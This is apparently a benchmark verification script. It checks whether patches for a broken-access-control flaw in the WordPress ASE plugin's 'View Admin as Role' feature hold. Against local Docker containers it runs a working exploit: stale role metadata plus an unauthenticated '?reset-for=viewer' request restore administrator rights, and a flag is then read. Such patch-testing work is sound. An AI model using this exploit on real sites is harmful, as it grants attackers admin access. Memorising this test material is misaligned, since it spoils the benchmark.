#!/usr/bin/env bash
# =====================================================================
# PCBV2-0051 admin-and-site-enhancements-ase-wordpress-plugin-cve-2026-12083
#   pair: CVE-2024-43333 -> CVE-2026-12083 (ASE "View Admin as Role" broken access control)
#   seed     (CVE-2024-43333): admin 通过 profile 编辑屏（wp_update_user -> profile_update）
#            降级 viewer，stale meta `_asenha_view_admin_as_original_roles` 保留；
#            未认证 GET /?reset-for=viewer 恢复 administrator -> admin-ajax `pcb_secret`
#            泄漏 flag。V0 (ASE 7.6.2 任何降级路径都不清理) 可达；
#            V1 (ASE 7.6.3 修复只挂 profile_update) 清理 meta -> reset-for 无物可恢复 -> 阻断。
#   residual (CVE-2026-12083): 同一 reset-for，降级改走 WP_User::set_role()
#            （set_user_role 钩子，7.6.3 修复漏挂）-> V1 stale meta 仍在 ->
#            reset-for 恢复 administrator -> 达 flag（不完整修复）；V2 (8.8.4 加
#            set_user_role 清理 + token 化 reset) 阻断。
#   效果通道 = admin-ajax pcb_secret 响应 JSON 的 data.flag（仅管理员可读）
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

# 宿主端口：compose.env（start 写入）优先，再 docker compose --profile port
SVC="wp-$VERSION"
case "$VERSION" in
  v0) FALLBACK="${PORT_WP_V0_0:-}";;
  v1) FALLBACK="${PORT_WP_V1_0:-}";;
  v2) FALLBACK="${PORT_WP_V2_0:-}";;
  *) FALLBACK="";;
esac
PORT="${PUBLISHED_PORT:-}"
if [[ -z "$PORT" ]]; then
  for _ in $(seq 1 30); do
    PORT="$(dc port "$SVC" 80 2>/dev/null | head -1 | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
    if [[ -n "$PORT" ]]; then
      break
    fi
    sleep 1
  done
fi
PORT="${PORT:-$FALLBACK}"
if [[ -z "$PORT" ]]; then
  echo "ERR: cannot resolve published $SVC:80 (need --profile / compose.env)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"

# 就绪等待：与 start.sh 相同，curl wp-login 200
ready=0
for _ in $(seq 1 90); do
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/wp-login.php" || true)"
  if [[ "$code" == "200" ]]; then
    ready=1
    break
  fi
  sleep 2
done
[[ "$ready" == "1" ]] || { echo "ERR: wordpress $VERSION not ready on :$PORT" >&2; exit 20; }

DEMOTE="profile_update"
[[ "$MODE" == "--residual" ]] && DEMOTE="set_user_role"
SVC="wp-$VERSION"

# 执行 + 判定（逻辑与 poc/seed_exec.py 一致；该执行器引用缺失常量不可直接运行，故自实现）
#   1) reset state  2) seed switched state（stale meta） 3) demote viewer
#   4) 未认证 GET /?reset-for=viewer  5) viewer 登录  6) admin-ajax pcb_secret
"$PY" - "$PORT" "$RUN_FLAG" "$DEMOTE" "$COMPOSE_PROJECT_NAME" "$CASE_DIR" "$VERSION" "$MODE" <<'PYEOF'
import json, os, subprocess, sys, time

port, flag, demote, project, case_dir, version, mode = sys.argv[1:8]
base = f"http://127.0.0.1:{port}"
service = f"wp-{version}"
VICTIM, VICTIM_PW = "viewer", "viewerpass"

import requests  # noqa: E402

def wp_eval(php: str) -> str:
    r = subprocess.run(
        ["docker", "compose", "-p", project, "--project-directory", case_dir,
         "--profile", version, "exec", "-T", service, "wp", "eval", php,
         "--allow-root", "--path=/var/www/html"],
        text=True, capture_output=True, check=False)
    if r.returncode != 0:
        raise RuntimeError(f"wp eval rc={r.returncode}: {(r.stderr or '')[:300]}")
    return r.stdout

def demote_viewer(path: str) -> None:
    if path == "profile_update":
        wp_eval("$u=get_user_by('login','viewer');"
                "wp_update_user(array('ID'=>$u->ID,'role'=>'subscriber'));")
    elif path == "set_user_role":
        wp_eval("$u=get_user_by('login','viewer');$u->set_role('subscriber');")
    else:
        raise ValueError(f"unknown demotion_path {path}")

def reset_state() -> None:
    wp_eval("$u=get_user_by('login','viewer');$u->set_role('administrator');"
            "delete_user_meta($u->ID,'_asenha_view_admin_as_original_roles');"
            "delete_user_meta($u->ID,'_asenha_viewing_admin_as');"
            "$o=get_option('admin_site_enhancements',array());"
            "$o['viewing_admin_as_role_are']=array();"
            "update_option('admin_site_enhancements',$o,true);")

def seed_switched_state() -> None:
    wp_eval("$u=get_user_by('login','viewer');"
            "foreach((array)$u->roles as $r){$u->remove_role($r);}"
            "$u->add_role('subscriber');"
            "update_user_meta($u->ID,'_asenha_view_admin_as_original_roles',array('administrator'));"
            "update_user_meta($u->ID,'_asenha_viewing_admin_as','subscriber');"
            "$o=get_option('admin_site_enhancements',array());"
            "$o['viewing_admin_as_role_are']=array('viewer');"
            "update_option('admin_site_enhancements',$o,true);")

def reset_for_attack() -> int:
    r = requests.get(f"{base}/", params={"reset-for": VICTIM}, timeout=20, allow_redirects=False)
    return r.status_code

def login(user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.get(f"{base}/wp-login.php", timeout=15)
    s.cookies.set("wordpress_test_cookie", "WP Cookie check")
    s.post(f"{base}/wp-login.php",
           data={"log": user, "pwd": pw, "wp-submit": "Log In",
                 "redirect_to": f"{base}/wp-admin/", "testcookie": "1"},
           timeout=15, allow_redirects=True)
    if not any(c.name.startswith("wordpress_logged_in") for c in s.cookies):
        raise RuntimeError(f"login failed for {user}")
    return s

def read_admin_flag(sess: requests.Session) -> dict:
    r = sess.get(f"{base}/wp-admin/admin-ajax.php", params={"action": "pcb_secret"}, timeout=20)
    try:
        body = r.json()
    except Exception:
        body = {"_raw": r.text[:300]}
    return {"status": r.status_code, "body": body}

result = {}
last_err = None
for attempt in range(3):
    result = {}
    try:
        reset_state()
        seed_switched_state()
        demote_viewer(demote)
        result["reset_for_status"] = reset_for_attack()
        s = login(VICTIM, VICTIM_PW)
        result["flag_read"] = read_admin_flag(s)
        role = wp_eval("$u=get_user_by('login','viewer');echo implode(',',(array)$u->roles);")
        result["viewer_roles_after"] = role.strip()
        last_err = None
        break
    except Exception as e:  # noqa: BLE001
        last_err = e
        result["error"] = f"{type(e).__name__}: {e}"
        time.sleep(8)

out = json.dumps(result, default=str)
print(f"[verify {mode}] version={version} demotion={demote}")
print(out[:800])
if last_err is not None:
    err = type(last_err).__name__ + ": " + str(last_err)
    if any(s in err for s in ("Connection", "not running", "timeout", "Timeout")):
        sys.exit(20)
body = json.dumps(result.get("flag_read", {}).get("body", ""), default=str)
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$RUN_FLAG)" >&2
exit "$RC"
